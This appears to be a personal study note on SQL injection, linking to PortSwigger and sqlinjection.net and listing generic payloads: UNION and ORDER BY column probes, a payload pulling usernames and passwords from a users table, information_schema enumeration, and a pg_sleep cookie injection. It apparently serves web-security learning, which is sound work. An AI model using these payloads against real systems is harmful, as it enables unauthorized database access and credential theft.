# SQL Injection
Tags: #sqli #database
Related to: [[oracle]]
See also:
Previous:

## Links
Title: Portswigger SQLi cheatsheet
Link: https://portswigger.net/web-security/sql-injection/cheat-sheet
Description: Useful payloads for SQLi testing. Has different modifications per database

Title: Find Table Names for SQL Injection
Link: https://www.sqlinjection.net/table-names/
Description: More info into actually getting table info from schema tables. More in detail than the Portswigger cheatsheet

## Notes
- You don't need to SELECT FROM something (e.g. `SELECT 1`, `SELECT NULL,NULL`)
- Swap out `--` for `#` sometimes. It may cause an error in some cases and not in others


### UNION attack
-  How many columns are being returned from the original query?
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query?
e.g.: `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

`' ORDER BY 1--  
' ORDER BY 2--  
' ORDER BY 3--`
`' UNION SELECT NULL--  
' UNION SELECT NULL,NULL--  
' UNION SELECT NULL,NULL,NULL--`

### Joining multiple resutls into one column
e.g. in the case where you want two strings from different columns, but only one column in the original query uses the string type.

In the below example, column 1 does not support strings, but column2 does. This gives us `username~password` from the users table..

`' UNION SELECT null,username || '~' || password FROM users--`

### Getting table names
Non-Oracle:
`' UNION SELECT table_name,NULL from information_schema.tables--`

### SQLi into Cookies
Use concantenation to avoid using semi-colons or spaces that can fuck up how the Request is parsed

Comments at the end are still necessary,e.g.
`x'||pg_sleep(10)--`